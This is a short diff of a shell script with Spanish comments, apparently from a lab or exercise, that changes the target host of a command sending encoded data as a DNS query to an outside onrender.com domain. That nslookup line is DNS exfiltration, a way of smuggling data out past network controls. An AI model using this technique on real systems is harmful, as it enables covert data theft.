@@ -12,7 +12,7 @@ echo "Dato codificado: $DATOS_CODIFICADOS"
 echo "Enviando consulta DNS con el payload incrustado..."
 
 # Se envía la consulta DNS utilizando bind-tools (nslookup)
-nslookup "${DATOS_CODIFICADOS}.servidor-web-dmz-ebl.onrender.com"
+nslookup "${DATOS_CODIFICADOS}.servidor-web-dmz-dpino.onrender.com"
 
 echo "=== CONSULTA DNS ENVIADA ==="
 
